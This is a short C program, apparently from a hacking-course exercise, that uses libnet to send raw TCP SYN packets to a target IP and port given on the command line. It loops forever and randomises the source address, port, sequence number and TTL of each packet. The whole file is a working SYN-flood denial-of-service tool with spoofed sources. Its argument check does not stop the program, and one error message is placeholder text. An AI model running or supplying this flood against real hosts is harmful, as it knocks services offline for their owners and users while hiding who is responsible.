
#include <libnet.h>
#include <string.h>
#include <pcap.h>
#include "hacking-network.h"



int main(int argc, char* argv[]){
	libnet_t* l;
	u_long dest_ip;
	u_short dest_port;
	char errbuf[PCAP_ERRBUF_SIZE];
	int i=0, ipv4Ptag, tcpPtag, checksum; 

	if((l=libnet_init(LIBNET_RAW4, "eth0", errbuf)) == NULL)
		fatal("fdfdsfs");

	if (argc != 3)
		printf("Usage: %s <target ip> <target port>", argv[0]);

	dest_ip = libnet_name2addr4(l, argv[1], LIBNET_DONT_RESOLVE);
	dest_port = (u_short) atoi(argv[2]);

	libnet_seed_prand(l);

	while(1){
		if((tcpPtag = libnet_build_tcp(
				libnet_get_prand(LIBNET_PRu16),
				dest_port,
				libnet_get_prand(LIBNET_PRu32),
				libnet_get_prand(LIBNET_PRu32),
				TH_SYN,
				libnet_get_prand(LIBNET_PRu16),
				0,
				0,
				LIBNET_TCP_H,
				NULL,
				0,
				l,
				i>0?tcpPtag:0))==-1)
			fatal("build with tcp");

		if ((ipv4Ptag=libnet_build_ipv4(
			 	LIBNET_IPV4_H+LIBNET_TCP_H,
			 	IPTOS_LOWDELAY,
			 	libnet_get_prand(LIBNET_PRu16),
			 	0,
			 	libnet_get_prand(LIBNET_PR8),
			 	IPPROTO_TCP,
			 	0,
			 	libnet_get_prand(LIBNET_PRu32),
			 	dest_ip,
			 	NULL,
			 	0,
			 	l,
			 	i>0?ipv4Ptag:0))==-1)
			fatal("build with ipv4");

		if((checksum=libnet_write(l)) != LIBNET_TCP_H + LIBNET_IPV4_H){
			printf("[?] Some or all beats is not writen -> [%d/%d]\n", checksum, LIBNET_IPV4_H+LIBNET_TCP_H);
			continue;
		}
		printf("[?] All %d were be writing\n", checksum);


		i++;
	}


	libnet_destroy(l);
	return 0;
}